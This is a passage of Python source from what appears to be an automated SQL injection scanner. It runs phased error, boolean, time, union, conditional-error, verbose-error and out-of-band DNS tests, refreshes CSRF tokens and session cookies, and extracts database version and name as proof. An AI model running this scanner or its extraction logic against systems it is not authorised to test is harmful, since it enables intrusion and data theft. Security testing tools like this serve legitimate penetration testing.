                        for indicator in error_results["indicators"]:
                            detection_indicators["error_based"].append(indicator)
                        results["detection_summary"]["error_based"] = True
                        if _stop:
                            self.scan_progress.emit(
                                "  ⏭️  Stop-on-first: vulnerability confirmed — skipping remaining phases for this point"
                            )

                    # PHASE 2: BOOLEAN-BASED DETECTION
                    if not (_stop and point_results):
                        self.scan_progress.emit("\n[PHASE 2] Testing Boolean-Based Blind SQL Injection...")
                        boolean_results = self._test_boolean_based(
                            point, full_url, parsed, params, headers, cookies, full_body_params,
                            method, baseline_status, baseline_length, baseline_text,
                            test_payloads["boolean_based"], param_reflected
                        )
                        if boolean_results["vulnerable"]:
                            point_results.extend(boolean_results["details"])
                            for indicator in boolean_results["indicators"]:
                                detection_indicators["boolean_based"].append(indicator)
                            results["detection_summary"]["boolean_based"] = True
                            if _stop:
                                self.scan_progress.emit(
                                    "  ⏭️  Stop-on-first: vulnerability confirmed — skipping remaining phases for this point"
                                )
                    else:
                        self.scan_progress.emit("\n[PHASE 2] ⏭️  Skipped (stop-on-first, already confirmed)")

                    # PHASE 3: TIME-BASED BLIND DETECTION
                    if not (_stop and point_results):
                        self.scan_progress.emit("\n[PHASE 3] Testing Time-Based Blind SQL Injection...")
                        time_results = self._test_time_based(
                            point, full_url, parsed, params, headers, cookies, full_body_params,
                            method, baseline_time, test_payloads["time_based"]
                        )
                        if time_results["vulnerable"]:
                            point_results.extend(time_results["details"])
                            for indicator in time_results["indicators"]:
                                detection_indicators["time_based"].append(indicator)
                            results["detection_summary"]["time_based"] = True
                            if not results["database_fingerprint"] and time_results.get("db_fingerprint"):
                                results["database_fingerprint"] = time_results["db_fingerprint"]
                            if _stop:
                                self.scan_progress.emit(
                                    "  ⏭️  Stop-on-first: vulnerability confirmed — skipping remaining phases for this point"
                                )
                    else:
                        self.scan_progress.emit("\n[PHASE 3] ⏭️  Skipped (stop-on-first, already confirmed)")

                    # PHASE 4: UNION-BASED DETECTION
                    if not (_stop and point_results):
                        self.scan_progress.emit("\n[PHASE 4] Testing Union-Based SQL Injection...")
                        union_results = self._test_union_based(
                            point, full_url, parsed, params, headers, cookies, full_body_params,
                            method, baseline_length, test_payloads["union_based"]
                        )
                        if union_results["vulnerable"]:
                            point_results.extend(union_results["details"])
                            for indicator in union_results["indicators"]:
                                detection_indicators["union_based"].append(indicator)
                            results["detection_summary"]["union_based"] = True
                            if _stop:
                                self.scan_progress.emit(
                                    "  ⏭️  Stop-on-first: vulnerability confirmed — skipping remaining phases for this point"
                                )
                    else:
                        self.scan_progress.emit("\n[PHASE 4] ⏭️  Skipped (stop-on-first, already confirmed)")

                    # PHASE 5: CONDITIONAL ERROR-BASED BLIND DETECTION
                    if not (_stop and point_results):
                        self.scan_progress.emit("\n[PHASE 5] Testing Conditional Error-Based Blind SQL Injection (CASE WHEN 1/0)...")
                        cond_err_results = self._test_conditional_error_based(
                            point, full_url, parsed, params, headers, cookies, full_body_params,
                            method, baseline_status, baseline_length, test_payloads["conditional_error"]
                        )
                        if cond_err_results["vulnerable"]:
                            point_results.extend(cond_err_results["details"])
                            for indicator in cond_err_results["indicators"]:
                                detection_indicators["conditional_error"].append(indicator)
                            results["detection_summary"]["conditional_error"] = True
                            if _stop:
                                self.scan_progress.emit(
                                    "  ⏭️  Stop-on-first: vulnerability confirmed — skipping remaining phases for this point"
                                )
                    else:
                        self.scan_progress.emit("\n[PHASE 5] ⏭️  Skipped (stop-on-first, already confirmed)")

                    # PHASE 6: VERBOSE ERROR DATA EXTRACTION (CAST to incompatible type)
                    if not (_stop and point_results):
                        self.scan_progress.emit("\n[PHASE 6] Testing Verbose Error-Based Data Extraction (CAST/CONVERT)...")
                        verbose_err_results = self._test_verbose_error_based(
                            point, full_url, parsed, params, headers, cookies, full_body_params,
                            method, baseline_status, baseline_length, test_payloads["verbose_error"]
                        )
                        if verbose_err_results["vulnerable"]:
                            point_results.extend(verbose_err_results["details"])
                            for indicator in verbose_err_results["indicators"]:
                                detection_indicators["verbose_error"].append(indicator)
                            results["detection_summary"]["verbose_error"] = True
                            if _stop:
                                self.scan_progress.emit(
                                    "  ⏭️  Stop-on-first: vulnerability confirmed — skipping remaining phases for this point"
                                )
                    else:
                        self.scan_progress.emit("\n[PHASE 6] ⏭️  Skipped (stop-on-first, already confirmed)")

                    # PHASE 7: OUT-OF-BAND (OAST) DETECTION via interactsh
                    if not (_stop and point_results):
                        if self.oast_url:
                            self.scan_progress.emit("\n[PHASE 7] Testing Out-of-Band (OAST) SQL Injection via interactsh DNS...")
                            oast_results = self._test_sqli_oast(
                                point, full_url, parsed, params, headers, cookies, full_body_params,
                                method, self.oast_url, test_payloads["oast"]
                            )
                            if oast_results["vulnerable"]:
                                point_results.extend(oast_results["details"])
                                for indicator in oast_results["indicators"]:
                                    detection_indicators["oast"].append(indicator)
                                results["detection_summary"]["oast"] = True
                        else:
                            self.scan_progress.emit("\n[PHASE 7] OAST SQLi: skipped (no interactsh URL configured)")
                    else:
                        self.scan_progress.emit("\n[PHASE 7] ⏭️  Skipped (stop-on-first, already confirmed)")

                # If we found any vulnerability in this point, save it
                if point_results:
                    # ── POC extraction for non-time-based confirmed findings ─────
                    # Time-based already runs its own POC inside _test_time_based.
                    # For error-based / verbose-error / union-based detections, try
                    # to extract DB version and name here as a best-effort bonus.
                    _db_hint = results.get("database_fingerprint") or None
                    _poc_needed = (
                        not any(r.get("poc") for r in point_results)  # no POC yet
                        and (
                            detection_indicators.get("error_based")
                            or detection_indicators.get("verbose_error")
                            or detection_indicators.get("union_based")
                            or detection_indicators.get("conditional_error")
                        )
                    )
                    if _poc_needed:
                        # Infer db_name from known error indicators if fingerprint not set
                        if not _db_hint:
                            for _ind_list in detection_indicators.values():
                                for _ind in _ind_list:
                                    for _db in ("MySQL", "PostgreSQL", "MSSQL", "Oracle", "SQLite"):
                                        if _db.lower() in _ind.lower():
                                            _db_hint = _db
                                            break
                                    if _db_hint:
                                        break
                        _db_hint = _db_hint or "MySQL"  # default probe order
                        self.scan_progress.emit(
                            f"\n  🔬 Running POC extraction ({_db_hint}) for confirmed injection..."
                        )
                        poc_info = self._extract_sqli_poc(
                            _db_hint, point, full_url, parsed, params,
                            headers, cookies, full_body_params, method
                        )
                        if poc_info:
                            # Attach to the first detail record and emit results
                            if point_results:
                                point_results[0]["poc"] = poc_info
                            self._emit_poc_block(poc_info)
                        else:
                            self.scan_progress.emit(
                                "  ℹ️  POC extraction: no data leaked via error/union channel "
                                "(blind-only target — use time-based blind extraction for full PoC)"
                            )

                    # Calculate confidence score for this injection point
                    confidence = self._calculate_confidence(detection_indicators)
                    
                    vulnerable_point = {
                        "injection_point": point["name"],
                        "injection_type": point["type"],
                        "injection_display": point["display"],
                        "original_value": point["original_value"],
                        "detection_methods": list(detection_indicators.keys()),
                        "indicators": dict(detection_indicators),
                        "confidence": confidence,
                        "param_reflected": param_reflected,
                        "baseline": {
                            "status": baseline_status,
                            "length": baseline_length,
                            "time": baseline_time
                        },
                        "evidence": point_results[:10],  # Limit to 10 evidence items
                        "vulnerability_chain": self._build_vulnerability_chain(detection_indicators)
                    }
                    
                    results["vulnerable"] = True
                    results["details"].append(vulnerable_point)
                    results["vulnerable_points"].append(f"{point['display']} [{confidence} confidence]")
                    
                    # Update overall confidence score (convert to string for storage)
                    confidence_value = self._confidence_to_value(confidence)
                    current_value = self._confidence_to_value(results["confidence_score"])
                    if confidence_value > current_value:
                        results["confidence_score"] = confidence
            
            # Generate final summary
            if results["vulnerable"]:
                results["summary"] = self._generate_detailed_summary(results)
            else:
                results["summary"] = "❌ No SQL injection vulnerabilities detected after comprehensive testing."
                
            self.scan_progress.emit(f"\n{'='*60}")
            self.scan_progress.emit("📋 SCAN COMPLETE")
            self.scan_progress.emit(f"{'='*60}")
            self.scan_progress.emit(results["summary"])
            
        except Exception as e:
            logger.error(f"SQLi scan error: {e}")
            results["error"] = str(e)
        finally:
            # Always restore boost_mode regardless of how the scan exits
            self.boost_mode = _saved_boost

        return results
    
    def _confidence_to_value(self, confidence: str) -> int:
        """Convert confidence string to numeric value for comparison"""
        if confidence == "HIGH":
            return 100
        elif confidence == "MEDIUM":
            return 60
        elif confidence == "LOW":
            return 30
        else:  # INFO or unknown
            return 0
    
    def _get_sqli_baseline_response(self, full_url, method, headers, body_params, cookies):
        """Get baseline response for comparison"""
        try:
            start = time.time()
            
            if method == "POST":
                content_type = headers.get("Content-Type", "").lower()
                if "application/json" in content_type:
                    body = json.dumps({k: v[0] for k, v in body_params.items()})
                else:
                    body = urllib.parse.urlencode(body_params, doseq=True)
                
                response = self.send_request_with_traffic(
                    full_url,
                    {k: v for k, v in headers.items() if k.lower() != 'host'},
                    method="POST",
                    body=body,
                    payload_type="SQLi-Baseline"
                )
            else:
                response = self.send_request_with_traffic(
                    full_url,
                    {k: v for k, v in headers.items() if k.lower() != 'host'},
                    method=method,
                    payload_type="SQLi-Baseline"
                )
            
            if response:
                elapsed = time.time() - start
                return {
                    "status": response.status_code,
                    "length": len(response.content),
                    "time": round(elapsed, 3),
                    "text": response.text if hasattr(response, 'text') else ""
                }
            return None
        except Exception as e:
            logger.warning(f"Baseline request failed: {e}")
            return None

    def _fetch_fresh_csrf(self, full_url: str, headers: dict,
                          csrf_field_name: str) -> dict:
        """
        GET the page at full_url and extract a fresh CSRF token + any new
        session cookie issued by the server.

        Some apps (e.g. PortSwigger labs) issue a brand-new session cookie on
        every page load and bind the CSRF token to THAT session.  If we POST
        with the old session but the new token, the server rejects it because
        the token isn't bound to the old session.

        Returns a dict:
            {
                "token":   str | None,   # fresh CSRF token value
                "session": str | None,   # new session cookie value (if rotated)
                "session_name": str | None,  # cookie name (e.g. "session")
            }
        """
        result = {"token": None, "session": None, "session_name": None}
        try:
            get_headers = {k: v for k, v in headers.items()
                           if k.lower() not in ('host', 'content-type',
                                                'content-length')}
            response = self.send_request_with_traffic(
                full_url, get_headers, method="GET",
                payload_type="CSRF-Refresh"
            )
            if not response or not hasattr(response, 'text'):
                return result

            # ── Extract new session cookie from Set-Cookie header ─────────
            # requests stores response cookies in response.cookies (a CookieJar)
            # and also exposes raw Set-Cookie via response.headers (may be
            # multi-value).  We check both.
            new_session = None
            session_name = None

            # Try response.cookies first (requests parses Set-Cookie for us)
            if hasattr(response, 'cookies'):
                for cookie in response.cookies:
                    # Match any cookie whose name looks like a session identifier
                    if any(kw in cookie.name.lower()
                           for kw in ('session', 'sess', 'sid', 'auth', 'token')):
                        new_session = cookie.value
                        session_name = cookie.name
                        break

            # Fallback: parse raw Set-Cookie header string
            if not new_session and hasattr(response, 'headers'):
                raw_sc = response.headers.get('Set-Cookie', '')
                if raw_sc:
                    # e.g. "session=abc123; Secure; HttpOnly; SameSite=None"
                    first_pair = raw_sc.split(';')[0].strip()
                    if '=' in first_pair:
                        cname, cval = first_pair.split('=', 1)
                        cname = cname.strip()
                        if any(kw in cname.lower()
                               for kw in ('session', 'sess', 'sid', 'auth', 'token')):
                            new_session = cval.strip()
                            session_name = cname

            result["session"] = new_session
            result["session_name"] = session_name

            html = response.text

            # ── Extract CSRF token from HTML ──────────────────────────────
            # 1. <input ... name="csrf_field_name" ... value="TOKEN">
            m = re.search(
                r'<input[^>]+name=["\']' + re.escape(csrf_field_name)
                + r'["\'][^>]+value=["\']([^"\']+)["\']',
                html, re.IGNORECASE
            )
            if m:
                result["token"] = m.group(1)
                return result

            # also try value= before name=
            m = re.search(
                r'<input[^>]+value=["\']([^"\']+)["\'][^>]+name=["\']'
                + re.escape(csrf_field_name) + r'["\']',
                html, re.IGNORECASE
            )
            if m:
                result["token"] = m.group(1)
                return result

            # 2. <meta name="csrf-token" content="TOKEN">
            m = re.search(
                r'<meta[^>]+name=["\']csrf-token["\'][^>]+content=["\']([^"\']+)["\']',
                html, re.IGNORECASE
            )
            if m:
                result["token"] = m.group(1)
                return result

        except Exception as e:
            logger.debug(f"CSRF refresh failed: {e}")

        return result

    def _with_fresh_csrf(self, body_params: dict, full_url: str,
                         headers: dict) -> tuple:
        """
        Return (refreshed_body_params, refreshed_headers) with any CSRF-like
        field replaced with a fresh token fetched from the login page, and the
        Cookie header updated if the server rotated the session.

        Only refreshes fields that:
          - are blocked by _should_test_body_param  (CSRF/token fields)
          - have a value ≥ 16 chars  (looks like a real token)

        Returns a tuple — never mutates the originals.
        """
        refreshed_body   = body_params.copy()
        refreshed_headers = headers.copy()

        for field_name in list(refreshed_body.keys()):
            current_val = refreshed_body[field_name][0] if refreshed_body[field_name] else ""
            should_test, _ = self._should_test_body_param(field_name, current_val)
            if should_test:
                continue   # injectable field — leave as-is
            if len(current_val) < 16:
                continue   # too short to be a CSRF token

            fetch = self._fetch_fresh_csrf(full_url, refreshed_headers, field_name)

            # Update token in body
            if fetch["token"] and fetch["token"] != current_val:
                self.scan_progress.emit(
                    f"  🔄 Refreshed CSRF token for '{field_name}'"
                )
                refreshed_body[field_name] = [fetch["token"]]

            # Update session cookie in headers if server rotated it
            if fetch["session"] and fetch["session_name"]:
                old_cookie_header = refreshed_headers.get(
                    next((k for k in refreshed_headers if k.lower() == 'cookie'), 'Cookie'),
                    ''
                )
                # Replace the old session value with the new one in the Cookie header
                new_cookie_header = re.sub(
                    r'(?<![^\s;])' + re.escape(fetch["session_name"])
                    + r'=[^;]*',
                    fetch["session_name"] + '=' + fetch["session"],
                    old_cookie_header
                )
                if new_cookie_header != old_cookie_header:
                    cookie_key = next(
                        (k for k in refreshed_headers if k.lower() == 'cookie'), 'Cookie'
                    )
                    refreshed_headers[cookie_key] = new_cookie_header
                    self.scan_progress.emit(
                        f"  🔄 Updated session cookie '{fetch['session_name']}' "
                        f"(server rotated on CSRF page load)"
                    )

        return refreshed_body, refreshed_headers
        
    def _test_conditional_error_based(self, point, full_url, parsed, params, headers, cookies, body_params,
                                       method, baseline_status, baseline_length, payloads):
        """
        Blind SQLi detection via conditional errors (CASE WHEN 1/0 technique).

        Strategy: send TRUE-condition payload (should cause DB divide-by-zero → HTTP 500)
        and FALSE-condition payload (should evaluate to 'a' = no error → HTTP 200).
        If true → error AND false → no error: confirmed injectable.
        """
        results = {"vulnerable": False, "details": [], "indicators": []}

        # Pair true/false variants
        ce_pairs = [
            ("ce_mysql_true",    "ce_mysql_false"),
            ("ce_sub_true",      "ce_sub_false"),
            ("ce_pgsql_true",    "ce_pgsql_false"),
            ("ce_mssql_true",    "ce_mssql_false"),
        ]

        for true_name, false_name in ce_pairs:
            if not self.running:
                break
            if true_name not in payloads or false_name not in payloads:
                continue

            true_resp = self._send_error_payload(
                point, full_url, parsed, params, headers, cookies, body_params,
                method, true_name, payloads[true_name]
            )
            false_resp = self._send_error_payload(
                point, full_url, parsed, params, headers, cookies, body_params,
                method, false_name, payloads[false_name]
            )

            if true_resp is None or false_resp is None:
                continue

            true_status  = getattr(true_resp,  'status_code', 0)
            false_status = getattr(false_resp, 'status_code', 0)

            # Check: true payload causes error, false payload does not
            true_is_error  = true_status == 0 or true_status >= 500
            false_is_ok    = 200 <= false_status < 400

            if true_is_error and false_is_ok:
                self.scan_progress.emit(
                    f"  ✅ Conditional-error blind [{true_name}/{false_name}]: "
                    f"true={true_status} (error), false={false_status} (ok)"
                )
                results["vulnerable"] = True
                detail = {
                    "technique":    "conditional_error",
                    "payload_true": payloads[true_name],
                    "payload_false": payloads[false_name],
                    "true_status":  true_status,
                    "false_status": false_status,
                    "baseline_status": baseline_status,
                    "description":  (
                        "CASE WHEN (1=1) THEN 1/0 ELSE 'a' END triggered DB error on true condition, "
                        "but not on false condition — confirms injectable parameter"
                    )
                }
                results["details"].append(detail)
                results["indicators"].append(
                    f"Conditional-error blind (true→{true_status} error, false→{false_status} ok)"
                )
                break  # One confirmed pair is enough

            # Also accept: true diverges from baseline, false matches baseline
            elif (false_status == baseline_status
                  and true_status != baseline_status
                  and true_status > 0 and false_status > 0):
                self.scan_progress.emit(
                    f"  ✅ Conditional-error blind [{true_name}/{false_name}]: "
                    f"true diverges ({true_status} vs baseline {baseline_status}), false matches ({false_status})"
                )
                results["vulnerable"] = True
                detail = {
                    "technique":    "conditional_error",
                    "payload_true": payloads[true_name],
                    "payload_false": payloads[false_name],
                    "true_status":  true_status,
                    "false_status": false_status,
                    "baseline_status": baseline_status,
                    "description":  (
                        "True condition diverged from baseline; false condition matched baseline. "
                        "Confirms conditional-error blind SQLi."
                    )
                }
                results["details"].append(detail)
                results["indicators"].append(
                    f"Conditional-error blind (true→{true_status}≠baseline, false→{false_status}=baseline)"
                )
                break

            else:
                self.scan_progress.emit(
                    f"  — Conditional-error [{true_name}]: true={true_status}, false={false_status} — not conclusive"
                )

        # Also test the standalone data-extraction probe (detects if Users/Administrator table exists)
        if not results["vulnerable"] and "ce_extract_probe" in payloads and self.running:
            probe_resp = self._send_error_payload(
                point, full_url, parsed, params, headers, cookies, body_params,
                method, "ce_extract_probe", payloads["ce_extract_probe"]
            )
            if probe_resp is not None:
                probe_status = getattr(probe_resp, 'status_code', 0)
                if probe_status >= 500 or probe_status == 0:
                    self.scan_progress.emit(
                        f"  ⚠️  Conditional-error extract probe: status={probe_status} "
                        f"(possible Users table + blind extraction feasible)"
                    )

        return results

    def _test_verbose_error_based(self, point, full_url, parsed, params, headers, cookies, body_params,
                                   method, baseline_status, baseline_length, payloads):
        """
        Data extraction via verbose DB error messages (CAST/EXTRACTVALUE technique).

        CAST((SELECT sensitive_data) AS int) causes the DB to output the value in the
        error message, turning blind SQLi into visible data extraction.
        """
        results = {"vulnerable": False, "details": [], "indicators": []}

        # Patterns that indicate the DB leaked data in an error message
        verbose_error_patterns = [
            # MySQL EXTRACTVALUE / UPDATEXML leak the tilde-wrapped value
            (r"XPATH syntax error: '~([^'~]+)~'", "MySQL EXTRACTVALUE/UPDATEXML data leak"),
            (r"XPATH syntax error.*?'([^']+)'",    "MySQL XPATH error data leak"),
            # PostgreSQL / generic CAST error
            (r'invalid input syntax for (?:type )?integer: "([^"]+)"', "PostgreSQL CAST integer error"),
            (r'invalid input syntax for type integer: "([^"]+)"',       "PostgreSQL CAST integer error"),
            # MSSQL CONVERT error
            (r"Conversion failed when converting the (?:varchar|nvarchar) value '([^']+)' to data type int", "MSSQL CONVERT error"),
            (r"Error converting data type (?:varchar|nvarchar) to int", "MSSQL type conversion error"),
            # Oracle type mismatch
            (r"ORA-01722: invalid number",  "Oracle invalid number error"),
            (r"ORA-\d+:",                   "Oracle error"),
            # Generic — any error with DB keywords + a quoted value
            (r'(?:syntax|conversion|invalid)[^"\']*["\']([^"\']{3,80})["\']', "DB error with extracted value"),
        ]

        for payload_name, payload in payloads.items():
            if not self.running:
                break

            response = self._send_error_payload(
                point, full_url, parsed, params, headers, cookies, body_params,
                method, payload_name, payload
            )

            if response is None:
                continue

            resp_text = getattr(response, 'text', '') or ''

            for pattern, description in verbose_error_patterns:
                m = re.search(pattern, resp_text, re.IGNORECASE)
                if m:
                    extracted = m.group(1) if m.lastindex else m.group(0)
                    self.scan_progress.emit(
                        f"  ✅ Verbose-error extraction [{payload_name}]: "
                        f"{description} — leaked: '{extracted[:60]}'"
                    )
                    results["vulnerable"] = True
                    detail = {
                        "technique":      "verbose_error",
                        "payload_name":   payload_name,
                        "payload":        payload,
                        "db_error_desc":  description,
                        "extracted_data": extracted[:200],
                        "status_code":    getattr(response, 'status_code', '?'),
                        "description":    (
                            f"Database leaked data via error message using CAST/EXTRACTVALUE. "
                            f"Extracted: '{extracted[:80]}'"
                        )
                    }
                    results["details"].append(detail)
                    results["indicators"].append(
                        f"Verbose-error extraction ({description}): '{extracted[:40]}'"
                    )
                    break

            if results["vulnerable"]:
                break  # One confirmed is enough

        return results

    def _test_sqli_oast(self, point, full_url, parsed, params, headers, cookies, body_params,
                         method, raw_oast_url, payloads):
        """
        Out-of-band (OAST) SQL injection detection using interactsh.

        Fires DNS-triggering payloads for MySQL / MSSQL / Oracle / PostgreSQL.
        The caller must check interactsh for incoming DNS interactions manually.
        The method returns a 'sent' result so the finding is logged (user verifies OOB).
        """
        results = {"vulnerable": False, "details": [], "indicators": []}

        # Normalise OAST domain (strip scheme/port/path)
        try:
            if "://" in raw_oast_url:
                parsed_oast = urllib.parse.urlparse(raw_oast_url)
                oast_domain = parsed_oast.netloc or parsed_oast.path
            else:
                oast_domain = raw_oast_url
            oast_domain = oast_domain.split(':')[0].split('/')[0].strip()
            if not oast_domain:
                oast_domain = raw_oast_url
        except Exception:
            oast_domain = raw_oast_url

        self.scan_progress.emit(f"  ℹ️  OAST SQLi domain: {oast_domain}")
        self.scan_progress.emit("  ℹ️  Monitor https://app.interactsh.com/ for DNS interactions.")

        payloads_sent = 0
        for payload_name, payload_template in payloads.items():
            if not self.running:
                break

            # Substitute the interactsh domain into the payload
            payload = payload_template.replace("{OAST_DOMAIN}", oast_domain)

            response = self._send_error_payload(
                point, full_url, parsed, params, headers, cookies, body_params,
                method, payload_name, payload
            )
            payloads_sent += 1

            status = getattr(response, 'status_code', 0) if response else 0
            self.scan_progress.emit(
                f"  ↳ OAST payload sent [{payload_name}] → HTTP {status}"
            )

        # We can't auto-confirm OOB, so we log as "payloads sent — check interactsh"
        if payloads_sent > 0:
            self.scan_progress.emit(
                f"\n  ⚠️  {payloads_sent} OAST SQLi payload(s) fired. "
                f"Check https://app.interactsh.com/ for DNS interactions from target."
            )
            # Record as informational (not confirmed vulnerable without OOB hit)
            results["details"].append({
                "technique":     "oast",
                "payloads_sent": payloads_sent,
                "oast_domain":   oast_domain,
                "description":   (
                    f"{payloads_sent} OAST SQLi payloads fired to trigger DNS lookups to "
                    f"{oast_domain}. Check interactsh for interactions to confirm."
                )
            })
            results["indicators"].append(
                f"OAST SQLi: {payloads_sent} payloads sent to {oast_domain} — check interactsh"
            )
            # Mark as vulnerable=True only when there are hits (manual verification needed)
            # We mark it as a finding so it surfaces in results but with OAST caveat
            results["vulnerable"] = True

        return results

    def _test_error_based(self, point, full_url, parsed, params, headers, cookies, body_params,
                        method, baseline_status, baseline_length, payloads):
        """Test for error-based SQL injection - with working classic SQLi detection"""
        results = {
            "vulnerable": False,
            "details": [],
            "indicators": []
        }
        
        # -------- CLASSIC SQLi DETECTION - WITH DEBUGGING ----------
        if "single_quote" in payloads and "two_single_quote" in payloads:
            self.scan_progress.emit(f"  🔍 Testing classic SQLi on {point['display']}...")
            
            # Send single quote payload
            single_response = self._send_error_payload(
                point, full_url, parsed, params, headers, cookies, body_params,
                method, "single_quote", payloads["single_quote"]
            )
            
            # Send two single quotes payload
            two_single_response = self._send_error_payload(
                point, full_url, parsed, params, headers, cookies, body_params,
                method, "two_single_quote", payloads["two_single_quote"]
            )
            
            
            # CRITICAL FIX: Check if responses are truthy AND have status_code attribute
            if single_response is not None and two_single_response is not None:
                single_status = getattr(single_response, 'status_code', 0)
                two_single_status = getattr(two_single_response, 'status_code', 0)
                

                # SIMPLE, ROBUST DETECTION LOGIC
                single_is_error = False
                two_single_is_fixed = False
                
                # Criteria 1: Single quote causes complete failure (status 0) or server error (500+)
                if single_status == 0:
                    single_is_error = True
                    self.scan_progress.emit(f"    ✓ Single quote caused request failure (connection error)")
                elif single_status >= 500:
                    single_is_error = True
                    self.scan_progress.emit(f"    ✓ Single quote caused server error ({single_status})")
                
                # Criteria 2: Single quote returns different status than baseline AND double quote matches baseline
                elif single_status != baseline_status and two_single_status == baseline_status:
                    single_is_error = True
                    self.scan_progress.emit(f"    ✓ Single quote changed status ({single_status} vs baseline {baseline_status})")
                
                # Criteria 3: Single quote is error (4xx) and double quote is success (2xx)
                elif 400 <= single_status < 500 and 200 <= two_single_status < 300:
                    single_is_error = True
                    self.scan_progress.emit(f"    ✓ Single quote is client error, double quote is success")
                
                # Double quote fixes the issue
                if two_single_status == baseline_status:
                    two_single_is_fixed = True
                    self.scan_progress.emit(f"    ✓ Double quote matches baseline ({baseline_status})")
                elif two_single_status < 400 and two_single_status > 0:
                    two_single_is_fixed = True
                    self.scan_progress.emit(f"    ✓ Double quote returns success ({two_single_status})")
                elif two_single_status == 0:
                    self.scan_progress.emit(f"    ❌ Double quote also failed - not a SQLi vulnerability")
                
                if single_is_error and two_single_is_fixed:
                    results["vulnerable"] = True
                    detail = {
                        "payload_name": "classic_sqli",
                        "payload": f"' and ''",
                        "db_type": "Unknown",
                        "error_pattern": f"Classic SQLi: ' → {single_status}, '' → {two_single_status}",
                        "status_code": single_status,
                        "fixed_status_code": two_single_status,
                        "baseline_status": baseline_status,
                        "length_diff": 0
                    }
                    results["details"].append(detail)
                    results["indicators"].append(f"Classic SQLi (' → {single_status}, '' → {two_single_status})")
                    
                    self.scan_progress.emit(
                        f"  ✓✓✓ CLASSIC SQLi DETECTED! {point['display']} - "
                        f"' → {single_status}, '' → {two_single_status}"
                    )
                else:
                    self.scan_progress.emit(f"    ❌ Not vulnerable to classic SQLi")
            else:
                self.scan_progress.emit(f"    ⚠️ Failed to get responses - single: {type(single_response)}, two: {type(two_single_response)}")
                self.scan_progress.emit(f"    single_response is None: {single_response is None}")
                self.scan_progress.emit(f"    two_single_response is None: {two_single_response is None}")
        # -----------------------------------------------------------------
        
        # SQL error patterns
        sql_error_patterns = [
            # MySQL
            (r"SQL syntax.*MySQL", "MySQL"),
            (r"Warning.*mysql_.*", "MySQL"),
            (r"MySQLSyntaxErrorException", "MySQL"),
            (r"valid MySQL result", "MySQL"),
            (r"check the manual that corresponds to your MySQL server", "MySQL"),
            (r"com.mysql.jdbc", "MySQL"),
            (r"Zend_Db_Statement_Mysqli_Exception", "MySQL"),
            
            # PostgreSQL
            (r"PostgreSQL.*ERROR", "PostgreSQL"),
            (r"Warning.*\Wpg_.*", "PostgreSQL"),
            (r"valid PostgreSQL result", "PostgreSQL"),
            (r"Npgsql\.", "PostgreSQL"),
            (r"PG::SyntaxError", "PostgreSQL"),
            
            # Microsoft SQL Server
            (r"Driver.*SQL Server", "MSSQL"),
            (r"OLE DB.*SQL Server", "MSSQL"),
            (r"(\W|_)SQLServer", "MSSQL"),
            (r"Microsoft.*ODBC.*SQL Server", "MSSQL"),
            (r"Microsoft.*OLE DB.*SQL Server", "MSSQL"),
            (r"System.Data.SqlClient", "MSSQL"),
            (r"Exception.*SqlClient", "MSSQL"),
            
            # Oracle
            (r"Oracle.*Driver", "Oracle"),
            (r"Oracle.*ORA-", "Oracle"),
            (r"OracleException", "Oracle"),
            (r"System.Data.OracleClient", "Oracle"),
            
            # SQLite
            (r"SQLite\.", "SQLite"),
            (r"SQLite3::", "SQLite"),
            (r"unrecognized token", "SQLite"),
            
            # Generic
            (r"SQL syntax", "Generic SQL"),
            (r"unclosed quotation mark", "Generic SQL"),
            (r"quoted string not properly terminated", "Generic SQL"),
            (r"Unclosed quotation mark", "Generic SQL"),
            (r"Incorrect syntax near", "Generic SQL"),
        ]
        
        # Test all other error-based payloads
        if self.boost_mode:
            with concurrent.futures.ThreadPoolExecutor(max_workers=getattr(self, "scan_max_workers", 8)) as executor:
                futures = {}
                for payload_name, payload in payloads.items():
                    if not self.running:
                        break
                    future = executor.submit(
                        self._send_error_payload,
                        point, full_url, parsed, params, headers, cookies, body_params,
                        method, payload_name, payload
                    )
                    futures[future] = payload_name
                
                for future in concurrent.futures.as_completed(futures):
                    if results["vulnerable"] and self.scan_stop_on_first:
                        future.cancel()
                        continue
                    payload_name = futures[future]
                    try:
                        response = future.result(timeout=15)
                        if response:
                            response_text = response.text if hasattr(response, 'text') else ""
                            
                            # Check for SQL errors in response
                            for pattern, db_type in sql_error_patterns:
                                if re.search(pattern, response_text, re.IGNORECASE):
                                    results["vulnerable"] = True
                                    detail = {
                                        "payload_name": payload_name,
                                        "payload": payloads[payload_name],
                                        "db_type": db_type,
                                        "error_pattern": pattern,
                                        "status_code": response.status_code,
                                        "length_diff": len(response.content) - baseline_length
                                    }
                                    results["details"].append(detail)
                                    results["indicators"].append(f"Error-based ({db_type}: {payload_name})")
                                    
                                    self.scan_progress.emit(f"  ✅ Error-based: {payload_name} triggered {db_type} error")
                                    break
                            
                            # Check for status code changes that might indicate error
                            if response.status_code >= 500 and baseline_status < 500:
                                results["vulnerable"] = True
                                detail = {
                                    "payload_name": payload_name,
                                    "payload": payloads[payload_name],
                                    "db_type": "Unknown",
                                    "error_pattern": f"HTTP {response.status_code}",
                                    "status_code": response.status_code,
                                    "length_diff": len(response.content) - baseline_length
                                }
                                results["details"].append(detail)
                                results["indicators"].append(f"Error-based (HTTP {response.status_code})")
                                
                                self.scan_progress.emit(f"  ✅ Error-based: {payload_name} caused HTTP {response.status_code}")
                    except Exception as e:
                        continue
        else:
            # Sequential testing
            for payload_name, payload in payloads.items():
                if not self.running:
                    break
                if results["vulnerable"] and self.scan_stop_on_first:
                    break

                response = self._send_error_payload(
                    point, full_url, parsed, params, headers, cookies, body_params,
                    method, payload_name, payload
                )
                
                if response:
                    response_text = response.text if hasattr(response, 'text') else ""
                    
                    # Check for SQL errors in response
                    for pattern, db_type in sql_error_patterns:
                        if re.search(pattern, response_text, re.IGNORECASE):
                            results["vulnerable"] = True
                            detail = {
                                "payload_name": payload_name,
                                "payload": payload,
                                "db_type": db_type,
                                "error_pattern": pattern,
                                "status_code": response.status_code,
                                "length_diff": len(response.content) - baseline_length
                            }
                            results["details"].append(detail)
                            results["indicators"].append(f"Error-based ({db_type}: {payload_name})")
                            
                            self.scan_progress.emit(f"  ✅ Error-based: {payload_name} triggered {db_type} error")
                            break
                    
                    # Check for status code changes that might indicate error
                    if response.status_code >= 500 and baseline_status < 500:
                        results["vulnerable"] = True
                        detail = {
                            "payload_name": payload_name,
                            "payload": payload,
                            "db_type": "Unknown",
                            "error_pattern": f"HTTP {response.status_code}",
                            "status_code": response.status_code,
                            "length_diff": len(response.content) - baseline_length
                        }
                        results["details"].append(detail)
